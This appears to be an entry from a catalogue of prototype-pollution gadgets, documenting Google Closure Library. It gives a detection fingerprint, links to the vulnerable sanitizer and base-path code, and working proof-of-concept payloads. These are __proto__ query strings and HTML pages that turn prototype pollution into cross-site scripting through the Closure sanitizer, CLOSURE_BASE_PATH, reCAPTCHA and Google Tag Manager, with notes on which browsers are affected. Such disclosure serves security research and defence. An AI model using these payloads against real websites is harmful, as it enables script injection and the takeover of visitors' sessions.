## Google Closure

Closure Library is a powerful, low-level JavaScript library designed for building complex and scalable web applications. 
It is used by many Google web applications, such as Google Search, Gmail, Google Docs, Google+, Google Maps, and others.

### URL

https://github.com/google/closure-library

### JS Fingerprint
```
return (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined')
```

### Vulnerable code fragment
https://github.com/google/closure-library/blob/5a0002f16c91d41f5de3dc7bdcafe9b74b1b4fa0/closure/goog/html/sanitizer/attributewhitelist.js#L22-L107
```js
goog.html.sanitizer.AttributeWhitelist = {
  '* ARIA-CHECKED': true,
  '* ARIA-COLCOUNT': true,
  '* ARIA-COLINDEX': true,
  '* ARIA-CONTROLS': true,
  '* ARIA-DESCRIBEDBY': tru
...
}
```
https://github.com/google/closure-library/blob/88f3857a26ec5ead36b4b49cb6c3f011cc534971/closure/goog/base.js#L2210-L2214
```js
  goog.findBasePath_ = function() {
    if (goog.global.CLOSURE_BASE_PATH != undefined &&
        // Anti DOM-clobbering runtime check (b/37736576).
        typeof goog.global.CLOSURE_BASE_PATH === 'string') {
      goog.basePath = goog.global.CLOSURE_BASE_PATH;
```
https://github.com/google/closure-library/blob/96a4b269b9ad15c008a392e5b59fe66fcf66b526/closure/goog/html/safehtml.js#L1066-L1067
```js
SafeHtml.EMPTY = new SafeHtml(
    (goog.global.trustedTypes && goog.global.trustedTypes.emptyHTML) || '',
```


### PoC

#### AttributeWhitelist

```
?__proto__[*%20ONERROR]=1&__proto__[*%20SRC]=1
```

```html
<script>
  Object.prototype['* ONERROR'] = 1;
  Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
  goog.require('goog.html.sanitizer.HtmlSanitizer');
  goog.require('goog.dom');
</script>
<body>
<script>
  const html = '<img src onerror=alert(1)>';
  const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
  const sanitized = sanitizer.sanitize(html);
  const node = goog.dom.safeHtmlToNode(sanitized);
          
  document.body.append(node);
</script>
```

#### CLOSURE_BASE_PATH

```
?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//
```

```html
<script>
  Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
  goog.require('goog.html.sanitizer.HtmlSanitizer');
  goog.require('goog.dom');
</script>
```

#### Google reCAPTCHA

**The vulnerability can be exploited in browsers that do not support Trusted Types. For example, FireFox.**

```
?__proto__[trustedTypes]=x&__proto__[emptyHTML]=<img/src/onerror%3dalert(1)>
```

```html
<script>
    Object.prototype.trustedTypes = "x";
    Object.prototype.emptyHTML = "<img/src/onerror=alert(1)>";
</script>
<script src="https://www.google.com/recaptcha/api.js"></script>
<div class="g-recaptcha" data-sitekey="your-site-key"/>
```

#### Google Tag Manager + Custom HTML Tag

**The vulnerability can be exploited in browsers that do not support Trusted Types. For example, FireFox.**

```
?__proto__[trustedTypes]=x&__proto__[emptyHTML]=<img/src/onerror%3dalert(1)>
```

```html
<script>
    Object.prototype.trustedTypes = "x";
    Object.prototype.emptyHTML = "<img/src/onerror=alert(1)>";
</script>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-WSPXXTG');</script>
```